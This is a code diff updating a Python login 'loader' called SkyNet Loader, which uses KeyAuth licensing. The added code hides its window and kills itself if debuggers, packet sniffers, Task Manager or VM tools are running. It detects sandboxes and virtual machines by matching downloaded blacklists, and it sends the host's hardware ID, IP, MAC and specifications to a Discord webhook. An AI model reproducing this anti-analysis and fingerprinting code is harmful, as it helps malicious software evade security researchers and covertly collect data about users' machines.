@@ -6,10 +6,12 @@
 #
 # WARNING! All changes made in this file will be lost!
 
-#UPDATE RELEASED
+#UPDATE: bug fixes, small improvements, faster loading time, faster login/register, hide/unhide console window
+#New updated soon. (embeds, error logging through discord/more logging options, toggleable auto-login)
 
 ###############################################MODULES###############################################
 import json as jsond  # json
+import win32gui, win32con
 import time  # sleep before exit
 import binascii  # hex encoding
 import requests  # https requests
@@ -26,10 +28,8 @@ from datetime import datetime
 import sys
 import os
 import os.path
-from requests_toolbelt.adapters.fingerprint import FingerprintAdapter
 import colorama
 from colorama import Fore
-from colorama import Style
 import Files.files_rc_rc
 import sys, os, re, ctypes, subprocess, requests
 import uuid
@@ -39,89 +39,46 @@ from urllib.request import Request, urlopen
 import dhooks
 from dhooks import Webhook
 import time
-import asyncio
 import threading
 ###############################################MODULES###############################################
 
 os.system("cls")
 
 ###############################################SETTINGS###############################################
-vmcheck_switch = True
-vtdetect_switch = True
-listcheck_switch = False
-anti_debug_switch = False
+vmcheck_switch = True #Enabled by default / Check if this file is running on a vm
+vtdetect_switch = True #Enabled by default / Info sending through Discord webhook
+listcheck_switch = False #Disabled by default / will block all blacklisted virustotal machines
+anti_debug_switch = True #Disabled by default / block debugger programs
+#If everything is on the program will be "fully protected"!
 windowname = "SkyNet Loader - Login"
+api = "discord webhook goes here" #DISCORD WEBHOOK
+hide_console_switch = False #HIDE CONSOLE SWITCH / Disabled by default, console will auto show after the user logged in(set it to false if u want to see the errors)
+windowhide = win32gui.GetForegroundWindow()
 width = 500
 height = 700
-#If everything is on the program will be fully protected!
+programblacklist = ["httpdebuggerui.exe", "wireshark.exe", "HTTPDebuggerSvc.exe", "fiddler.exe", "regedit.exe", "taskmgr.exe", "vboxservice.exe", "df5serv.exe", "processhacker.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "ida64.exe", "ollydbg.exe","pestudio.exe", "vmwareuser", "vgauthservice.exe", "vmacthlp.exe", "x96dbg.exe", "vmsrvc.exe", "x32dbg.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "xenservice.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "ksdumper.exe", "joeboxserver.exe"]
 ###############################################SETTINGS###############################################
 
-def block_debugger():
+if hide_console_switch == True:
+    win32gui.ShowWindow(windowhide, win32con.SW_HIDE)
+else:
+    pass
+
+def block_debuggers():
     while True:
-        time.sleep(0.7)
-        #print("Checking for debuggers...")
+        time.sleep(1)
         for proc in psutil.process_iter():
-            try:
-                processName = proc.name()
-                if processName == "HTTPDebuggerUI.exe":
-                    print("Blacklisted program found! HTTPDebuggerUI.exe")
-                    time.sleep(0)
+            if any(procstr in proc.name().lower() for procstr in programblacklist):
+                try:
+                    print("\nBlacklisted program found! Name: "+str(proc.name()))
+                    proc.kill()
                     os._exit(1) 
-                if processName == "HTTPDebuggerSvc.exe":
-                    print("Blacklisted program found! HTTPDebuggerSvc.exe")
-                    time.sleep(0)
-                    os._exit(1)
-                if processName == "Taskmgr.exe":
-                    print("Blacklisted program found! Task Manager")
-                    time.sleep(0)
-                    os._exit(1)
-                if processName == "ProcessHacker.exe":
-                    print("Blacklisted program found! ProcessHacker")
-                    time.sleep(0)
-                    os._exit(1)
-                if processName == "Wireshark.exe":
-                    print("Blacklisted program found! Wireshark")
-                    time.sleep(0)
-                    os._exit(1)
-                if processName == "OLLYDBG.EXE":
-                    print("Blacklisted program found! OLLYDBG")
-                    time.sleep(0)
-                    os._exit(1)
-                if processName == "x64dbg.exe":
-                    print("Blacklisted program found! x64dbg")
-                    time.sleep(0)
-                    os._exit(1)   
-                if processName == "x32dbg.exe":
-                    print("Blacklisted program found! x32dbg")
-                    time.sleep(0)
-                    os._exit(1)     
-                if processName == "x96dbg.exe":
-                    print("Blacklisted program found! x96dbg")
-                    time.sleep(0)
-                    os._exit(1)
-                if processName == "ida64.exe":
-                    print("Blacklisted program found! ida64")
-                    time.sleep(0)
-                    os._exit(1)   
-                if processName == "KsDumperClient.exe":
-                    print("Blacklisted program found! KsDumperClient")
-                    time.sleep(0)
-                    os._exit(1) 
-                if processName == "KsDumper.exe":
-                    print("Blacklisted program found! KsDumper")
-                    time.sleep(0)
-                    os._exit(1) 
-                if processName == "pestudio.exe ":
-                    print("Blacklisted program found! pestudio")
-                    time.sleep(0)
-                    os._exit(1)                                                   
-            except:
-                pass
+                except(psutil.NoSuchProcess, psutil.AccessDenied):
+                    pass
 
 def block_dlls():
     while True:
-        time.sleep(0.7)
-        #print("Checking for Sbie DLL Injection...")
+        time.sleep(1)
         try:
             sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
             print("Sandboxie DLL Detected")
@@ -146,7 +103,8 @@ mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
 computer = wmi.WMI()
 os_info = computer.Win32_OperatingSystem()[0]
 os_name = os_info.Name.encode('utf-8').split(b'|')[0]
-currentplat = os_name
+os_name = str(os_name).replace("'","");os_name = str(os_name).replace("b","")
+gpu = computer.Win32_VideoController()[0].Name
 hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
 hwidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
 pcnamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt')
@@ -155,7 +113,6 @@ iplist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-black
 maclist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
 gpulist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
 platformlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_platforms.txt')
-api = "DISCORD WEBHOOK GOES HERE"
 
 def vtdetect():
     webhooksend = Webhook(api)
@@ -169,9 +126,8 @@ MAC: {mac}
 PLATFORM: {os_name}
 CPU: {computer.Win32_Processor()[0].Name}
 RAM: {str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB
-GPU: {computer.Win32_VideoController()[0].Name}
+GPU: {gpu}
 TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```""")
-
 
 def vmcheck():
     def get_base_prefix_compat(): # define all of the checks
@@ -316,8 +272,6 @@ def listcheck():
         time.sleep(2) 
         os._exit(1)
 
-    gpu = computer.Win32_VideoController()[0].Name
-
     try:
         if gpu in gpulist.text:        
             print('BLACKLISTED GPU DETECTED!')
@@ -335,7 +289,7 @@ def listcheck():
 
 if anti_debug_switch == True:
     try:
-        b = threading.Thread(name='Anti-Debug', target=block_debugger)
+        b = threading.Thread(name='Anti-Debug', target=block_debuggers)
         b.start()
         b2 = threading.Thread(name='Anti-DLL', target=block_dlls)
         b2.start()
@@ -357,7 +311,6 @@ if listcheck_switch == True:
 else:
     pass
 
-
 def slow_type(text, speed, newLine = True):
     for i in text:
         print(i, end = "", flush = True)
@@ -365,7 +318,7 @@ def slow_type(text, speed, newLine = True):
     if newLine: 
         print() 
 
-def all():
+def all(): #example console program
     print("Hello, this is my test program!")
     time.sleep(3)
     os._exit(1)
@@ -439,37 +392,10 @@ class api:
         json = jsond.loads(response)
 
         if json["success"]:
-            time.sleep(1)
             #print("Successfully registered! Restarting program...")
             time.sleep(0)
             #python = sys.executable
             #os.execl(python, python, *sys.argv)
-        else:
-            print(json["message"])
-            sys.exit()
-
-    def upgrade(self, user, license):
-
-        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
-
-        post_data = {
-            "type": binascii.hexlify(("upgrade").encode()),
-            "username": encryption.encrypt(user, self.enckey, init_iv),
-            "key": encryption.encrypt(license, self.enckey, init_iv),
-            "sessionid": binascii.hexlify(self.sessionid.encode()),
-            "name": binascii.hexlify(self.name.encode()),
-            "ownerid": binascii.hexlify(self.ownerid.encode()),
-            "init_iv": init_iv
-        }
-
-        response = self.__do_request(post_data)
-
-        response = encryption.decrypt(response, self.enckey, init_iv)
-
-        json = jsond.loads(response)
-
-        if json["success"]:
-            print("Successfully upgraded user!")
         else:
             print(json["message"])
             sys.exit()
@@ -499,7 +425,8 @@ class api:
 
         if json["success"]:
             self.__load_user_data(json["info"])
-            time.sleep(1)
+            hider = win32gui.FindWindowEx(None, None, None, str(windowname))
+            win32gui.ShowWindow(hider, win32con.SW_HIDE)
             os.system("cls")
             slow_type(f"{Fore.RED}Successfully logged in! Starting program...{Fore.RESET}", 0.03)
             time.sleep(1)
@@ -507,51 +434,18 @@ class api:
             n = int(self.user_data.expires)
             n2 = int(self.user_data.createdate)
             n3 = int(self.user_data.lastlogin)
-            slow_type(f"{Fore.RED}Welcome back {Fore.GREEN}{keyauthapp.user_data.username}!", 0.02)
+            slow_type(f"{Fore.RED}Welcome back {Fore.GREEN}{keyauthapp.user_data.username}!", 0.02) #USER INFO DISPLAY
             slow_type(f"\n{Fore.RED}IP address: {Fore.GREEN}{keyauthapp.user_data.ip}", 0.02)
             slow_type(f"{Fore.RED}Hardware-Id: {Fore.GREEN}{keyauthapp.user_data.hwid}", 0.02)
             slow_type(f"{Fore.RED}Created at: {Fore.GREEN}{datetime.utcfromtimestamp(n2).strftime('%Y-%m-%d %H:%M:%S')}", 0.02)
             slow_type(f"{Fore.RED}Expires at: {Fore.GREEN}{datetime.utcfromtimestamp(n).strftime('%Y-%m-%d %H:%M:%S')}", 0.02)
             slow_type(f"{Fore.RED}Last login at: {Fore.GREEN}{datetime.utcfromtimestamp(n3).strftime('%Y-%m-%d %H:%M:%S')}{Fore.RESET}", 0.02)
             time.sleep(2)
-            hider = win32gui.FindWindowEx(None, None, None, str(windowname))
-            win32gui.ShowWindow(hider, win32con.SW_HIDE)
             os.system('cls')
             all()
         else:
             print(json["message"])
             time.sleep(2)
-            sys.exit()
-
-    def license(self, key, hwid=None):
-        if hwid is None:
-            hwid = others.get_hwid()
-
-        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
-
-        post_data = {
-            "type": binascii.hexlify(("license").encode()),
-            "key": encryption.encrypt(key, self.enckey, init_iv),
-            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
-            "sessionid": binascii.hexlify(self.sessionid.encode()),
-            "name": binascii.hexlify(self.name.encode()),
-            "ownerid": binascii.hexlify(self.ownerid.encode()),
-            "init_iv": init_iv
-        }
-
-        response = self.__do_request(post_data)
-        response = encryption.decrypt(response, self.enckey, init_iv)
-
-        json = jsond.loads(response)
-
-        if json["success"]:
-            self.__load_user_data(json["info"])
-            time.sleep(1)
-            print("Successfully logged into license! Starting program...")
-            time.sleep(1)
-            all()
-        else:
-            print(json["message"])
             sys.exit()
 
     def var(self, name):
@@ -571,57 +465,6 @@ class api:
 
         response = encryption.decrypt(response, self.enckey, init_iv)
 
-        json = jsond.loads(response)
-
-        if json["success"]:
-            return json["message"]
-        else:
-            print(json["message"])
-            time.sleep(5)
-            sys.exit()
-
-    def file(self, fileid):
-
-        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
-
-        post_data = {
-            "type": binascii.hexlify(("file").encode()),
-            "fileid": encryption.encrypt(fileid, self.enckey, init_iv),
-            "sessionid": binascii.hexlify(self.sessionid.encode()),
-            "name": binascii.hexlify(self.name.encode()),
-            "ownerid": binascii.hexlify(self.ownerid.encode()),
-            "init_iv": init_iv
-        }
-
-        response = self.__do_request(post_data)
-
-        response = encryption.decrypt(response, self.enckey, init_iv)
-
-        json = jsond.loads(response)
-
-        if not json["success"]:
-            print(json["message"])
-            time.sleep(5)
-            sys.exit()
-        return binascii.unhexlify(json["contents"])
-
-    def webhook(self, webid, param):
-
-        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
-
-        post_data = {
-            "type": binascii.hexlify(("webhook").encode()),
-            "webid": encryption.encrypt(webid, self.enckey, init_iv),
-            "params": encryption.encrypt(param, self.enckey, init_iv),
-            "sessionid": binascii.hexlify(self.sessionid.encode()),
-            "name": binascii.hexlify(self.name.encode()),
-            "ownerid": binascii.hexlify(self.ownerid.encode()),
-            "init_iv": init_iv
-        }
-
-        response = self.__do_request(post_data)
-
-        response = encryption.decrypt(response, self.enckey, init_iv)
         json = jsond.loads(response)
 
         if json["success"]:
@@ -733,13 +576,12 @@ class encryption:
 
 os.system("cls")
 
-keyauthapp = api("appname", "ownerid", "secret","1.0")
+keyauthapp = api("app name", "owner id", "secret","1.0") #KEYAUTH API
 
 keyauthapp.init()
 
 colorama.init()
-
-time.sleep(1)
+#FILE CHECK
 try:
     if os.path.isfile('Files/auth.json'):
         if jsond.load(open("Files/auth.json"))["authusername"] == "":
@@ -750,6 +592,7 @@ try:
                     authfile = jsond.load(f)
                     authuser = authfile.get('authusername')
                     authpass = authfile.get('authpassword')
+                    win32gui.ShowWindow(windowhide, win32con.SW_SHOW)
                     keyauthapp.login(authuser,authpass)
             except Exception as e:
                 print(e)
@@ -768,6 +611,7 @@ except Exception as e:
     print(f"Error while loading auth file... check if the auth file is missing/empty or not ERROR CODE: {e}")
     time.sleep(3)
     os._exit(1)
+    
 
 
 from PyQt5 import QtCore, QtGui, QtWidgets
@@ -847,8 +691,6 @@ class Ui_MainWindow(object):
             user = self.lineEdit_user.text()
             password = self.lineEdit_password.text()
             license = self.lineEdit_license.text()
-            #text = " Login Successful. "
-            #print(f"Login {self.lineEdit_user.text()} {self.lineEdit_password.text()}")
             if self.checkBox_save_user.isChecked():
                 if self.checkBox_register_user.isChecked():
                     import json as jason
@@ -857,8 +699,8 @@ class Ui_MainWindow(object):
                     jason.dump(config, open('Files/auth.json', 'w'), sort_keys=False, indent=4)
                     config["authpassword"] = (self.lineEdit_password.text())
                     jason.dump(config, open('Files/auth.json', 'w'), sort_keys=False, indent=4)
-                    #text = text + " | Save user: Yes "
                     try:
+                        win32gui.ShowWindow(windowhide, win32con.SW_SHOW)
                         keyauthapp.register(user,password,license)
                         time.sleep(1)
                         keyauthapp.login(user,password)
@@ -872,12 +714,14 @@ class Ui_MainWindow(object):
                         jason.dump(config, open('Files/auth.json', 'w'), sort_keys=False, indent=4)
                         config["authpassword"] = (self.lineEdit_password.text())
                         jason.dump(config, open('Files/auth.json', 'w'), sort_keys=False, indent=4)
+                        win32gui.ShowWindow(windowhide, win32con.SW_SHOW)
                         keyauthapp.login(user,password)
                     except Exception as e:
                         print(e)
             else:
                 if self.checkBox_register_user.isChecked():
                     try:
+                        win32gui.ShowWindow(windowhide, win32con.SW_SHOW)
                         keyauthapp.register(user,password,license)
                         time.sleep(1)
                         keyauthapp.login(user,password)
@@ -885,6 +729,7 @@ class Ui_MainWindow(object):
                         print(e)
                 else:
                     try:
+                        win32gui.ShowWindow(windowhide, win32con.SW_SHOW)
                         keyauthapp.login(user,password)
                     except Exception as e:
                         print(e)
@@ -1125,7 +970,6 @@ class Ui_MainWindow(object):
         # setting  the fixed size of window
         MainWindow.setFixedSize(width, height)
 
-
         #
         # FUNCTIONS
         #
@@ -1138,8 +982,6 @@ class Ui_MainWindow(object):
 
         # BT LOGIN
         self.pushButton_login.clicked.connect(self.checkFields)
-
-
 
         self.retranslateUi(MainWindow)
         QtCore.QMetaObject.connectSlotsByName(MainWindow)
